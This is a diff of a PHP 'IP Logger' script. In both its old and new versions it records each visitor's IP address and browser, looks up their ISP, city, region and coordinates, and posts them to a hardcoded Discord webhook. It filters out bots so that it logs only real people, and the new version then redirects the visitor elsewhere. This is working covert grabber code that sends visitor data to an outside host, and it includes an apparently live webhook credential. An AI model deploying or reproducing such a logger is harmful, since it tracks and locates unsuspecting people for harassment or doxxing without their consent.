@@ -1,45 +1,52 @@
-/* 
-Please keep this copyright statemnet in tact
-Original Creator Of This Webhook IP Logger: ᴮᵉᵗᵗᵉʳ ᴼᶠᶠ ᴳᵒⁿᵉ#0869
-Creation Date: 21/10/19 
-APIs Provided By: Octolus (geoiplookup.io) and IP-API (ip-api.com)
-
-
-NOTE: You can use this in every page if you make a it a external page and require it in every other page that is php.
-
-*/ 
-
 <?php
 
-        $webhookurl = "https://discord.com/api/webhooks/981101632269983784/9KL7OQRV3cNnwLsb0BG_keA6c_e8Q8gy1vijgQhBJhLea0J8y8H5vqpgro8jESOESQhx";
+//Get the IP & Info
+$IP       = $_SERVER['REMOTE_ADDR'];
+$Browser  = $_SERVER['HTTP_USER_AGENT'];
 
-        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
-        $browser = $_SERVER['HTTP_USER_AGENT'];
-        if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
-            exit();
-        }
-        $TheirDate = date('d/m/Y');
-        $TheirTime = date('G:i:s');
-        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
-        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
-        if($vpnCon->connection_type==="Corporate"){
-            $vpn = "Yes (Double Check: $details->isp)";
-        }else{
-            $vpn = "No (Double Check: $details->isp)";
-        }
-        $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
-        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";
+//Stop us from picking up bot ips
+if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
+    exit();
+}
 
-        $json_data = array ('content'=>"$data", 'username'=>"Vistor Visited From: $details->country", 'avatar_url'=> "$flag");
-        $make_json = json_encode($json_data);
-        $ch = curl_init( $webhookurl );
+//Info
+$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
+curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+$Info = json_decode(curl_exec($Curl)); 
+curl_close($Curl);
 
-        curl_setopt( $ch, CURLOPT_POST, 1);
-        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
-        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt( $ch, CURLOPT_HEADER, 0);
-        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+$ISP = $Info->isp;
+$Country = $Info->country;
+$Region = $Info->regionName;
+$City = $Info->city;
+$COORD = "$Info->lat, $Info->lon"; // Coordinates
 
-        $response = curl_exec( $ch );
+//Variables
+$Webhook    = "https://discord.com/api/webhooks/981101632269983784/9KL7OQRV3cNnwLsb0BG_keA6c_e8Q8gy1vijgQhBJhLea0J8y8H5vqpgro8jESOESQhx"; //Webhook here.
 
+$WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
+
+//JS we are going to send to the webhook.
+$JS = array(
+    'username'   => "$WebhookTag - IP Logger" , 
+    'avatar_url' => "https://vgy.me/GQe9bJ.png",
+    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
+);
+ 
+//Encode that JS so we can post it to the webhook
+$JSON = json_encode($JS);
+
+
+function IpToWebhook($Hook, $Content)
+{
+    //Use Curl to post to the webhook.
+      $Curl = curl_init($Hook);
+      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
+      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
+      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+      return curl_exec($Curl);
+}
+
+IpToWebhook($Webhook, $JSON);
+header("Location: https://www.littest.site");
 ?>
